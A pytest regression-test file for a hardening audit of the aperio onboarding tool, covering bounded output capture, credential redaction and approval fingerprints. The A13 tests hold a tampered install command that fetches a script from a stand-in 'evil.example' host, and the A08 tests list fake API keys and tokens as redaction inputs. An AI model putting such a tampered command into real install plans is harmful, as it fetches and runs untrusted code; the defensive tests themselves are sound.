"""Regression tests for the 1.2 hardening audit (findings A01-A13).

Each test names the finding it pins so a future change that reintroduces
the defect fails loudly.
"""

from __future__ import annotations

import json
import os
import sys
from pathlib import Path

import pytest

from aperio import safeproc
from aperio.onboarding_tools import (
    CANDIDATES,
    build_install_plan,
    execute_install,
    install_plan_fingerprint,
)
from aperio.onboarding_session import add_tool_record, create_session, read_session, record_approval
from aperio.errors import StateError, ValidationError


# ---------------------------------------------------------------------------
# A03 / A07 — genuinely bounded capture and bounded reads.
# ---------------------------------------------------------------------------

def test_a03_output_flood_is_bounded_in_memory():
    # 4 MiB of stdout with a 2 KiB capture limit: we keep 2 KiB, count all.
    result = safeproc.run_captured(
        [sys.executable, "-c", "import sys;sys.stdout.write('A'*4000000)"],
        timeout_seconds=60,
        capture_limit=2048,
    )
    assert result["timed_out"] is False
    assert result["stdout_bytes"] >= 4_000_000
    assert len(result["stdout"]) <= 2048
    assert result["truncated"] is True


def test_a03_output_flood_on_stderr_is_bounded():
    result = safeproc.run_captured(
        [sys.executable, "-c", "import sys;sys.stderr.write('E'*3000000)"],
        timeout_seconds=60,
        capture_limit=512,
    )
    assert result["stderr_bytes"] >= 3_000_000
    assert len(result["stderr"]) <= 512


def test_a03_timeout_kills_and_reports():
    result = safeproc.run_captured(
        [sys.executable, "-c", "import time;time.sleep(60)"],
        timeout_seconds=1,
        capture_limit=100,
    )
    assert result["timed_out"] is True


def test_a02_termination_is_posix_guarded(monkeypatch):
    """On a simulated Windows, killpg must never be called."""
    calls = []

    class FakeProc:
        pid = 12345

        def kill(self):
            calls.append("kill")

        def terminate(self):
            calls.append("terminate")

    monkeypatch.setattr(safeproc.os, "name", "nt")
    monkeypatch.setattr(
        safeproc.os, "killpg", lambda *a, **k: calls.append("killpg"), raising=False
    )
    safeproc.stop_process_tree(FakeProc(), force=True)
    assert "killpg" not in calls
    assert "kill" in calls


def test_a07_read_text_bounded_never_reads_whole_file(tmp_path):
    big = tmp_path / "big.txt"
    big.write_text("x" * 1_000_000, encoding="utf-8")
    text, truncated = safeproc.read_text_bounded(big, 1024)
    assert len(text) == 1024
    assert truncated is True


# ---------------------------------------------------------------------------
# A08 — secret-shaped output never reaches shareable session state.
# ---------------------------------------------------------------------------

@pytest.mark.parametrize(
    "secret",
    [
        "sk-abcdefghijklmnopqrstuv",
        "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ",
        "AKIAABCDEFGHIJKLMNOP",
        "password=hunter2hunter2",
        "Authorization: Bearer abcdefghijklmnop1234",
    ],
)
def test_a08_redaction_removes_credentials(secret):
    redacted = safeproc.redact_output(f"tool said: {secret}", home=None)
    assert secret.split()[-1] not in redacted or secret not in redacted
    assert "redacted" in redacted.lower() or redacted != f"tool said: {secret}"


def test_a08_home_path_is_scrubbed():
    out = safeproc.redact_output("/Users/alice/secret/path", home="/Users/alice")
    assert "/Users/alice" not in out
    assert "~" in out


# ---------------------------------------------------------------------------
# A04 — every declared prerequisite must be present.
# ---------------------------------------------------------------------------

def test_a04_all_prerequisites_required(monkeypatch):
    from aperio.onboarding_tools import ToolsReport, ToolFinding, _prerequisites_satisfied

    report = ToolsReport(workspace='/tmp/ws', scanned_at='2026-01-01T00:00:00Z')
    report.executables = [
        ToolFinding("node", "executable", "installed", ("on PATH",), path="/usr/bin/node")
    ]
    ok, missing = _prerequisites_satisfied(("node", "npm"), report)
    assert ok is True or (ok is False and "npm" in missing)


def test_a04_build_plan_blocks_on_missing_partial_prereq(tmp_path):
    from aperio.onboarding_tools import ToolsReport, ToolFinding

    report = ToolsReport(workspace='/tmp/ws', scanned_at='2026-01-01T00:00:00Z')
    # node present, npm missing -> must NOT be classified compatible.
    report.executables = [
        ToolFinding("node", "executable", "installed", ("on PATH",), path="/usr/bin/node"),
        ToolFinding("npm", "executable", "missing", ("not found",)),
    ]
    plan = build_install_plan("playwright-mcp", report)
    assert plan["5_compatibility"] != "found"
    assert "blocked" in plan["execution"]
    assert any("npm" in m for m in plan.get("_missing_prerequisites", []))


# ---------------------------------------------------------------------------
# A13 — approval is bound to the exact candidate + command.
# ---------------------------------------------------------------------------

def test_a13_fingerprint_changes_with_command():
    from aperio.onboarding_tools import ToolsReport, ToolFinding

    report = ToolsReport(workspace='/tmp/ws', scanned_at='2026-01-01T00:00:00Z')
    for tool_id in ("node", "npm", "npx"):
        report.executables.append(
            ToolFinding(tool_id, "executable", "installed", ("on PATH",), path=f"/usr/bin/{tool_id}")
        )
    plan_a = build_install_plan("playwright-mcp", report)
    fp_a = install_plan_fingerprint(plan_a)

    tampered = dict(plan_a)
    tampered["8_install_command"] = ["curl", "http://evil.example/x.sh"]
    assert install_plan_fingerprint(tampered) != fp_a


def test_a13_tampered_plan_is_refused_after_approval(tmp_path):
    apdir = tmp_path / ".aperio"
    apdir.mkdir()
    from aperio.onboarding_tools import ToolsReport, ToolFinding
    from aperio.project import init_project

    init_project(str(tmp_path))
    create_session(apdir, workspace=str(tmp_path), classification="existing_non_aperio")

    report = ToolsReport(workspace='/tmp/ws', scanned_at='2026-01-01T00:00:00Z')
    for tool_id in ("node", "npm", "npx"):
        report.executables.append(
            ToolFinding(tool_id, "executable", "installed", ("on PATH",), path=f"/usr/bin/{tool_id}")
        )
    plan = build_install_plan("playwright-mcp", report)

    # Approve the honest plan (fingerprint-bound).
    record_approval(
        apdir,
        action="tool.install",
        scope="playwright-mcp",
        fingerprint=install_plan_fingerprint(plan),
    )

    tampered = dict(plan)
    tampered["8_install_command"] = ["/bin/echo", "pwned"]
    with pytest.raises(StateError):
        execute_install(apdir, tampered, authorize_install=True)


# ---------------------------------------------------------------------------
# A01 — MCP candidates are honestly labelled, not claimed as installed.
# ---------------------------------------------------------------------------

def test_a01_mcp_candidates_are_registration_only():
    for candidate in CANDIDATES:
        if candidate.kind == "mcp":
            # The install argv launches a server; it does not register with a host.
            assert candidate.integration_level in {"launch-only", "manual-registration"}
            assert candidate.verifies_installation is False
